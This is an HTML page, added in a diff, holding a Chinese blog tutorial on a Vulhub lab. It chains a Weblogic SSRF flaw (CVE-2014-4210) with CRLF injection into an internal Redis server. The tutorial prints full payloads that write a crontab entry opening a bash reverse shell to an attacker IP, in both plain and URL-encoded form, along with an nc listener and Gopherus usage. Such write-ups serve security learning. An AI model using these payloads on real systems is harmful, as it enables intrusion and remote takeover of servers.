@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  
+  
+  <title>SSRF攻击内网Redis | W4rnIn9</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="SSRF,">
+  
+
+
+  
+    <meta name="description" content="网络安全爱好者 CTFer">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+  <script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+</head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JONER</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a href="/" target="_self">
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a href="/archives/" target="_self">
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path>
+          
+            <a href="javascript:void(0);" v-else>我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a href="https://github.com/joner11234" target="_blank">
+                    Github
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>SSRF攻击内网Redis</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2020-08-21
+    </span>
+    
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <p><strong>本文首发<a href="https://bbs.ichunqiu.com/thread-58263-1-1.html" target="_blank" rel="noopener">i春秋</a> 未经许可禁止转载.</strong></p>
+<h2 id="SSRF简介"><a href="#SSRF简介" class="headerlink" title="SSRF简介"></a>SSRF简介</h2><p>SSRF(server-side request forgery ):服务器端请求伪造。是一种由攻击者构造形成而由服务器端发起请求的一个安全漏洞，因为他是由服务器端发起的，所以他能够请求到与他相连而与外网隔离的内部系统，在一般情况下，ssrf攻击的目标是从外网无法访问的内部系统。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本次使用的靶机是Vulhub中的一个环境，搭建方法：将vulhub项目git到本地，切换到vulhub/weblogic/ssrf目录下，使用下面的命令进行搭建</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>搭建成功后使用<code>docker ps</code>命令可以看到正在运行的容器，其中Weblogic监听在7001端口，访问<a href="http://192.168.233.150:7001/console/地址会跳转到登录页面。" target="_blank" rel="noopener">http://192.168.233.150:7001/console/地址会跳转到登录页面。</a></p>
+<p><img src="/article/9d7d2c7d/image-20200819131140623.png" alt="image-20200819131140623"></p>
+<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>通过公网Weblgic 存在SSRF漏洞(CVE-2014-4210)，探测到内网某IP开放6379端口并运行着Redis服务，利用HTTP注入和Redis未授权访问漏洞进行反弹shell</p>
+<h2 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h2><h3 id="发现SSRF"><a href="#发现SSRF" class="headerlink" title="发现SSRF"></a>发现SSRF</h3><p>通过了解CVE-2014-4210可以知道， 漏洞位置在uddiexplorer下的SearchPublicRegistries.jsp处 ，因此我们可以直接访问 <a href="http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp进入到存在漏洞的页面，在`Search" target="_blank" rel="noopener">http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp进入到存在漏洞的页面，在`Search</a> by business name`处输入test 点击Search进行测试</p>
+<p><img src="/article/9d7d2c7d/image-20200819131851545.png" alt="image-20200819131851545"></p>
+<p>这时我们查看刚才整个过程的请求和相应包</p>
+<p><img src="/article/9d7d2c7d/image-20200819132221354.png" alt="image-20200819132221354"></p>
+<p>在operator参数中发现了url地址，这时我们对请求的内容进行修改，进行内网探测</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">operator=http://127.0.0.1:7001&amp;rdoSearch=name&amp;txtSearchname=test&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure>
+<p>在返回的数据包中出现了如现错误</p>
+<p><img src="/article/9d7d2c7d/image-20200819132540337.png" alt="image-20200819132540337"></p>
+<p>当访问其他未开放的端口时，会出现以下错误</p>
+<p><img src="/article/9d7d2c7d/image-20200819132904817.png" alt="image-20200819132904817"></p>
+<h3 id="发现Redis服务器"><a href="#发现Redis服务器" class="headerlink" title="发现Redis服务器"></a>发现Redis服务器</h3><p>这时就可以使用Burp的intruder模块对内网ip和端口进行探测，或者是使用脚本进行探测，通过探测可以发现172.18.0.2:6378端口可以连通</p>
+<p><img src="/article/9d7d2c7d/image-20200819135332850.png" alt="image-20200819135332850"></p>
+<h3 id="Redis反弹shell-header-CRLF-注入"><a href="#Redis反弹shell-header-CRLF-注入" class="headerlink" title="Redis反弹shell(header CRLF 注入)"></a>Redis反弹shell(header CRLF 注入)</h3><p>Weblogic的SSRF有一个比较大的特点，其虽然是一个<code>GET</code>请求，但是我们可以通过传入%0a%0d来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。  </p>
+<p>发送三条redis命令，将反弹shell的语句写入到/etc/corntab中</p>
+<blockquote>
+<p> crontab就是linux下的一个定时执行事件的一个程序 ，可以通过向/etc/corntab中写入相应命令，以一定时间间隔调度一些命令的执行 </p>
+</blockquote>
+<p>首先在攻击机上设置端口监听，在windows下的监听命令为</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 9696</span><br></pre></td></tr></table></figure>
+<p>这里写入的命令如下，其中的ip地址和端口为设置nc监听的机器ip和监听端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">test</span><br><span class="line"></span><br><span class="line">set 1 "\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.233.153/9696 0&gt;&amp;1\n\n\n\n"</span><br><span class="line">config set dir /etc/</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">hhh</span><br></pre></td></tr></table></figure>
+<p>因为服务器接收到数据会对数据进行url解码，所以这里先对写入的命令进行url编码，其中换行符<code>\r\n</code>，对应编码后的内容为<code>%0D%0A</code></p>
+<p>注意这里使用一些软件进行URL编码时并不会将换行符编码为<code>%0D%0A</code>而是<code>%0A</code>，所以需要注意以下并进行手动替换，替换后的payload为</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">test%</span><span class="bash">0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.233.153%2F9696%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Ahhh</span></span><br></pre></td></tr></table></figure>
+<p>最终post的数据为</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">operator=http://172.18.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.233.153%2F9696%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Ahhh&amp;rdoSearch=name&amp;txtSearchname=test&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure>
+<p><img src="/article/9d7d2c7d/image-20200819142002604.png" alt="image-20200819142002604"></p>
+<p>提交后就可以在监听的终端中拿到 shell了</p>
+<p><img src="/article/9d7d2c7d/image-20200819142027755.png" alt="image-20200819142027755"></p>
+<h3 id="Redis反弹shell-gophar协议"><a href="#Redis反弹shell-gophar协议" class="headerlink" title="Redis反弹shell(gophar协议)"></a>Redis反弹shell(gophar协议)</h3><p>gopher协议是比http协议更早出现的协议，现在已经不常用了，但是在SSRF漏洞利用中gopher可以说是万金油，因为可以使用gopher发送各种格式的请求包，利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。 </p>
+<p>这里介绍一个Gophar协议利用工具<a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">Gopharus</a></p>
+<blockquote>
+<p>该工具将帮助您生成Gopher有效负载，以利用SSRF（服务器端请求伪造）并获得RCE（远程代码执行）。 而且，它将帮助您在受害服务器上获得shell</p>
+</blockquote>
+<p>使用方法非常简单，按照提示就可以生成payload了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python gopherus.py --exploit redis</span><br></pre></td></tr></table></figure>
+<p><img src="/article/9d7d2c7d/image-20200819151555244.png" alt="image-20200819151555244"></p>
+<p>首先根据提示进行监听，然后将生成的payload放入burp相应的位置修改ip后进行提交，但在这里会提示如下错误</p>
+<p>An error has occurred<br>weblogic.uddi.client.structures.exception.XML_SoapException: unknown protocol: gopher</p>
+<p>也就是说这里不能使用gophar协议，如果是在其他环境下支持gophar协议的话就可以这样进行攻击了，但是这里可以将生成payload中的gophar改为http，然后Go一下，同样能得到shell</p>
+<p><img src="/article/9d7d2c7d/image-20200819152703232.png" alt="image-20200819152703232"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>SSRF漏洞本身危害不大，好多SRC上都将它评为低危，但由于它可以访问一些无法访问的内部系统，因此一旦它和其他漏洞进行结合利用，其危害不容小觑。</p>
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JONER <br>
+        
+        原文链接 : <a href>http://joner11234.github.io/article/9d7d2c7d.html</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share" style="margin-top: -2rem" data-wechat-qrcode-title="<p>微信扫一扫</p>" data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>" data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter">
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async></script>
+  
+
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/SSRF/">
+              #SSRF
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/article/23491f58.html" target="_self">Apache Shiro反序列化复现</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/article/9897b513.html" target="_self">SSRF系列之攻击FastCGI</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "1NXTyN2WX8S3WVndpU432Q6j-gzGzoHsz",
+      appKey: "qKRwkiwKUs1Q6PynhoYXoF4t",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+   
+
+</div>
+
+
+      <footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <p class="site-info">
+    博客已运行<span id="time-to-now"></span><span class="my-face">👦</span>
+    <br>
+    
+  </p>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2019, 3, 2).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
